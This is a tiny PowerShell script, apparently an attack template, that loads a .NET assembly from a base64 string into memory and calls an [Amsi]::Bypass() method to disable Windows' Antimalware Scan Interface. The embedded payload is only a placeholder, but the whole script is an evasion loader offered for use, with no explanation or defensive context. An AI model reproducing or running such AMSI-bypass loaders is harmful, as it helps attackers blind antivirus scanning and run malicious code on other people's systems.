function bpss{
    [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("<STRINGB64>"))
    [Amsi]::Bypass()
}

bpss
